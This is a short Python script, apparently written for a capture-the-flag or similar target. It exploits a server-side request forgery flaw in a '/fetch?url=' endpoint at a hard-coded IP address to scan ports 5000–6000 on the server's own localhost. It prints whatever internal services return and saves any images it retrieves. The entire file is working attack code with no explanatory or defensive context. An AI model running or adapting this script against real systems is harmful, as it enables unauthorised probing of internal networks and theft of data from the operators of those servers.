import requests
import time
import sys
import os

TARGET = "http://136.115.87.65:31770"

ERROR_PATTERNS = [
    "Connection refused",
    "Max retries exceeded",
    "NewConnectionError",
    "Failed to establish a new connection",
    "timed out"
]

print("[*] Starting port scan (5000–6000). This takes ~40 seconds...")
print("[*] Hit Ctrl+C to stop early.\n")

for port in range(5000, 6001):
    internal_url = f"http://127.0.0.1:{port}/"
    full_url = f"{TARGET}/fetch?url={internal_url}"
    
    print(f"\r[*] Scanning port {port}...", end="", flush=True)
    
    try:
        r = requests.get(full_url, timeout=1.5)
        if r.status_code == 200 and len(r.content) > 0:
            text = r.text
            if any(pattern.lower() in text.lower() for pattern in ERROR_PATTERNS):
                continue
            
            print(f"\n[+] Port {port} responded! Length: {len(r.content)} bytes")
            
            content_type = r.headers.get('Content-Type', '').lower()
            
            if 'image' in content_type:
                ext = content_type.split('/')[-1].split(';')[0]
                if ext in ('jpeg', 'pjpeg'):
                    ext = 'jpg'
                filename = f"image_{port}.{ext}"
                with open(filename, 'wb') as f:
                    f.write(r.content)
                print(f"    → Saved image to {filename}")
            else:
                print("\n--- Response Text ---")
                try:
                    print(text)
                except UnicodeDecodeError:
                    print(r.content)
                print("--- End ---\n")
                
    except requests.exceptions.Timeout:
        pass  
    except requests.exceptions.ConnectionError:
        pass  
    except Exception as e:
        pass  
    
    time.sleep(0.04)

print("\n[*] Scan complete. All genuine responses have been displayed/saved.")